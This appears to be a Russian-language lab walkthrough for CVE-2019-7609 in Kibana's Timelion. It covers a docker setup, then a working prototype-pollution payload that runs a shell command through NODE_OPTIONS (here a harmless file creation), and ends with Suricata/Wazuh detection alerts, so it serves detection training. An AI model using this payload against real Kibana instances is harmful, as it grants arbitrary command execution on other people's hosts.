# CVE-2019-7609

Kibana — это панель визуализации данных для Elasticsearch  с открытым исходным кодом.

Версии Kibana до 5.6.15 и 6.6.1 содержат ошибку выполнения произвольного кода в визуализаторе Timelion. Злоумышленник, имеющий доступ к приложению Timelion, может отправить запрос, который попытается выполнить JavaScript код. Благодаря этому злоумышленник может выполнять произвольные команды на хосте.

### Эксплуатация уязвимости

Перед запуском уязвимой среды выполните команду sudo sysctl -w vm.max\_map\_count=262145

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:5601/ будет доступна панель Kibana

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Для реализации уязвимости нужно перейти в визуализатор Timelion и отправить соответсвующую полезную нагрузку:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("/bin/touch /tmp/success");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

После этого перейдите во вкладку Canvas, чтобы выполнилась команда /bin/touch /tmp/success

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

После этого на хосте был создан файл /tmp/success

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
